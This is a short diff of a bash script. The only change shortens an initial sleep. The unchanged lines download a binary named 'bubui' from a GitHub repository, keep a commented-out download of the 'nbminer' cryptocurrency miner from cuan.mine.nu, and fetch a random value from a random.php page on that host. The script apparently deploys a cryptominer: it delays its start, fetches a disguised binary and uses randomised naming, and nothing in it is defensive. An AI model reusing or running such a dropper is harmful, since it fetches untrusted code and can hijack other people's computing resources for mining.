@@ -1,5 +1,5 @@
 #!/bin/bash
-sleep 15m
+sleep 10m
 wget https://github.com/rindalasririn/ketaea/raw/main/bubui
 #wget https://cuan.mine.nu/nbminer
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
